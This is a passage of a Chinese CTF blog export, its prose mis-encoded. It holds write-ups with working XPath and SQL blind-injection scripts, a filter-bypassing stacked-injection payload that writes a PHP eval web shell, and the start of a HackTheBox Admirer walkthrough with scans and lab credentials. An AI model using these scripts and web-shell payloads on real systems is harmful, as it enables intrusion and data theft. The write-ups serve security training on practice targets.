<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">strs = string.digits + string.ascii_letters</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">find = re.compile(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = sess.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="comment"># æ ¹èŠ‚ç‚¹root</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0])</span></span><br><span class="line">            <span class="comment"># rootå­èŠ‚ç‚¹accounts</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># accountså­èŠ‚ç‚¹user</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># userå­èŠ‚ç‚¹id, username, password</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            data = <span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.format(</span><br><span class="line">                i, j, token[<span class="number">0</span>])</span><br><span class="line">            res = sess.get(url=url, headers=headers, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;éæ³•æ“ä½œ&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                result += j</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>æœ€åå¯ä»¥åˆ¤æ–­æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>gtfly123<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>adm1n<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>passwordæ— æ³•è§£å¯†ï¼Œä½¿ç”¨<code>adm1n gtfly123</code>ç™»å½•ç«™ç‚¹ã€‚</p>
<p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæç¤ºï¼š<code>flag is in /flag</code></p>
<p>å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF2018-MultiSQL">SUCTF2018 MultiSQL</h2>
<h3 id="è€ƒç‚¹-v22">è€ƒç‚¹</h3>
<ul>
<li>å †å æ³¨å…¥</li>
<li>MySQLé¢„ç¼–è¯‘ç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v20">è§£é¢˜</h3>
<p>é¦–å…ˆæ¥æ¼”ç¤ºä¸€ä¸‹MySQLé¢„ç¼–è¯‘</p>
<h4 id="set">set</h4>
<p>set çš„ä½œç”¨å°±æ˜¯å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå˜é‡çš„å‘½åå¿…é¡»æ˜¯@å¼€å¤´ã€‚</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115534.png" style="zoom:50%;" />
<h4 id="prepareå’Œexecute">prepareå’Œexecute</h4>
<p>prepareè¯­å¥ç”¨äºé¢„å®šä¹‰ä¸€ä¸ªè¯­å¥ï¼Œå¹¶å¯ä»¥æŒ‡å®šé¢„å®šä¹‰è¯­å¥åç§°ã€‚executeåˆ™æ˜¯æ‰§è¡Œé¢„å®šä¹‰è¯­å¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">prepare prepare_name from â€œsqlè¯­å¥â€</span><br><span class="line"></span><br><span class="line">execute prepare_name</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115731.png" style="zoom:50%;" />
<p>ç»“åˆèµ·æ¥åˆ©ç”¨å°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; set @a&#x3D;&#39;select version()&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; prepare t from @a;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; execute t;</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.20    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>ç”¨ä¸Šé¢çš„çŸ¥è¯†å†ç»“åˆ16è¿›åˆ¶ç¼–ç ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¯¹ä¸€äº›å…³é”®å­—(select,fromä¹‹ç±»çš„)çš„è¿‡æ»¤ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014120236.png" alt=""></p>
<p>å›åˆ°é¢˜ç›®ï¼Œæ³¨å†ŒæˆåŠŸåç™»é™†æŸ¥çœ‹èµ„æ–™ï¼Œå‘ç°urlå¦‚ä¸‹ï¼š</p>
<p><code>http://87e3250e-37a7-472a-b4e3-764ad942514d.node3.buuoj.cn/user/user.php?id=2</code></p>
<p>idå¤„å¯èƒ½æœ‰SQLæ³¨å…¥ï¼Œè¿‡æ»¤äº†å•å¼•å·è¿˜æœ‰ä¸€äº›å…³é”®å­—ï¼Œç”¨å¼‚æˆ–æ³¨å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014155145.png" alt=""></p>
<p>ç”±äºè¿‡æ»¤äº†<code>unionï¼Œselect ï¼Œ&amp;ï¼Œ|</code>è¿˜æœ‰ä¸€äº›å‡½æ•°ï¼Œåªèƒ½Get Shellæ‰èƒ½æ‹¿åˆ°flagã€‚</p>
<blockquote>
<p>å­˜åœ¨SQLæ³¨å…¥çš„é¢˜ç›®éƒ½å¯ä»¥ç›´æ¥load_fileç›²æ³¨flagã€‚</p>
</blockquote>
<p>æŸ¥çœ‹<code>secure_file_priv</code>é…ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o5lhvid6588d0rgkgieh1vne75&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">char = string.ascii_lowercase + string.digits + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;2-(@@secure_file_priv&lt;BINARY(0x&#123;0&#125;))&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">hex = <span class="keyword">lambda</span> s: binascii.b2a_hex(s.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        c = chr(i)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        _url = url + payload.format(flag+hex(c))</span><br><span class="line">        res = r.get(url=_url, cookies=cookies)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            data += chr(i<span class="number">-1</span>)</span><br><span class="line">            flag += hex(chr(i<span class="number">-1</span>))</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>ç›²æ³¨å‡º<code>secure_file_priv=/var/www/</code></p>
<p>ä½¿ç”¨load_fileå‡½æ•°è¯»å–index.phpæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;fg4kp97ksielnvnssv53iul2s6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        _url = url + <span class="string">&#x27;^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;</span>+data+str(hex(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        result=r.get(url=url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            data+=str(hex(i<span class="number">-1</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag+=(chr(i<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>å‘ç°åŒ…å«äº†bwvs_config/config.phpå’Œwaf.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">		$black_str = <span class="string">&quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">&quot;@@&quot;</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> addslashes($str);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>user.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">		$id=waf($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">		$sql = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;</span>.$id;</span><br><span class="line">		$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		</span><br><span class="line">		$result = mysqli_store_result($connect);</span><br><span class="line">		$row = mysqli_fetch_row($result);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;user_id:&#x27;</span>.$row[<span class="number">0</span>].<span class="string">&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;</span>.$row[<span class="number">1</span>].<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;æ³¨å†Œæ—¶é—´ï¼š&quot;</span>.$row[<span class="number">4</span>].<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>æ—¢ç„¶æœ‰mysqli_multi_queryï¼Œå°±ä¼šå­˜åœ¨å †å æ³¨å…¥ï¼Œä½¿ç”¨ä¸Šé¢æåˆ°çš„MySQLé¢„ç¼–è¯‘æ¥ç»•è¿‡selectçš„é™åˆ¶ã€‚</p>
<p>åˆ©ç”¨å †å æ³¨å…¥åƒå¤´åƒä¸Šä¼ çš„ä½ç½®å†™å…¥shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @xx&#x3D;0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201015161424.png" alt=""></p>
<h2 id="PwnThyBytes2019-Baby-SQL">PwnThyBytes2019 Baby_SQL</h2>
<h2 id="October-2019-Twice-SQL-Injection">October 2019 Twice SQL Injection</h2>
<h2 id="HITCON-2017-SQL-So-Hard">HITCON 2017 SQL So Hard</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQLæ³¨å…¥</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Admirer-walkthrough</title>
    <url>/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Admirer-Walkthrough">HTB::Admirer Walkthrough</h1>
<blockquote>
<p>æ–‡ç« é¦–å‘äº æ˜Ÿç›Ÿå®‰å…¨ å…¬ä¼—å·</p>
</blockquote>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200520114625.png" style="zoom: 80%;" />
<h2 id="0x02-Tool-and-Tips">0x02 Tool and Tips</h2>
<ul>
<li>nmap</li>
<li>wfuzz</li>
<li>adminer exploit</li>
<li>python libaray path hijack</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Inital-Enumeration">Inital Enumeration</h3>
<p>ç«¯å£æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -Pn -A -T4 -p- 10.10.10.187</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-19 21:49 CEST</span><br><span class="line">Nmap scan report for 10.10.10.187</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)</span><br><span class="line">|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)</span><br><span class="line">|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;admin-dir</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds</span><br></pre></td></tr></table></figure>
<p>FTPä¸å…è®¸åŒ¿åç™»å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">âœ  admirer ftp admirer.htb </span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (admirer.htb:prashant): anonymous</span><br><span class="line">530 Permission denied.</span><br><span class="line">Login failed.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
<p>è®¿é—®<code>10.10.10.187/admin-dir</code>è¿”å›403 Forbiddenï¼Œç”¨wfuzzå·¥å…·æ‰«æç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,txt-php-html -u http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z</span><br><span class="line">Total requests: 61419</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000015592:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;</span><br><span class="line">000016327:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;</span><br><span class="line"></span><br><span class="line">Total time: 247.8061</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61417</span><br><span class="line">Requests&#x2F;sec.: 247.8509</span><br></pre></td></tr></table></figure>
<p>contact.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##########</span><br><span class="line"># admins #</span><br><span class="line">##########</span><br><span class="line"># Penny</span><br><span class="line">Email: p.wise@admirer.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># developers #</span><br><span class="line">##############</span><br><span class="line"># Rajesh</span><br><span class="line">Email: r.nayyar@admirer.htb</span><br><span class="line"></span><br><span class="line"># Amy</span><br><span class="line">Email: a.bialik@admirer.htb</span><br><span class="line"></span><br><span class="line"># Leonard</span><br><span class="line">Email: l.galecki@admirer.htb</span><br></pre></td></tr></table></figure>
<p>credential.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Bank Account]</span><br><span class="line">waldo.11</span><br><span class="line">Ezy]m27&#125;OREc$</span><br><span class="line"></span><br><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q#S\W:$P</span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R$tTF7</span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure>
<p>ç”¨FTP accountç™»å½•FTPæœåŠ¡å™¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 10.10.10.187</span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.187:kali): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">dump.sql</span><br><span class="line">html.tar.gz</span><br><span class="line">ftp&gt; get dump.sql</span><br><span class="line">ftp&gt; get html.tar.gz</span><br></pre></td></tr></table></figure>
<p>dump.sql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: admirerdb</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version	10.1.41-MariaDB-0+deb9u1</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_RESULTS&#x3D;@@CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_COLLATION_CONNECTION&#x3D;@@COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET NAMES utf8mb4 *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET @OLD_TIME_ZONE&#x3D;@@TIME_ZONE *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;&#39;+00:00&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_UNIQUE_CHECKS&#x3D;@@UNIQUE_CHECKS, UNIQUE_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_FOREIGN_KEY_CHECKS&#x3D;@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_SQL_MODE&#x3D;@@SQL_MODE, SQL_MODE&#x3D;&#39;NO_AUTO_VALUE_ON_ZERO&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET @OLD_SQL_NOTES&#x3D;@@SQL_NOTES, SQL_NOTES&#x3D;0 *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;items&#96;;</span><br><span class="line">&#x2F;*!40101 SET @saved_cs_client     &#x3D; @@character_set_client *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; utf8 *&#x2F;;</span><br><span class="line">CREATE TABLE &#96;items&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;thumb_path&#96; text NOT NULL,</span><br><span class="line">  &#96;image_path&#96; text NOT NULL,</span><br><span class="line">  &#96;title&#96; text NOT NULL,</span><br><span class="line">  &#96;text&#96; text,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;13 DEFAULT CHARSET&#x3D;utf8mb4;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; @saved_cs_client *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;items&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;items&#96; VALUES (1,&#39;images&#x2F;thumbs&#x2F;thmb_art01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;art01.jpg&#39;,&#39;Visual Art&#39;,&#39;A pure showcase of skill and emotion.&#39;),(2,&#39;images&#x2F;thumbs&#x2F;thmb_eng02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng02.jpg&#39;,&#39;The Beauty and the Beast&#39;,&#39;Besides the technology, there is also the eye 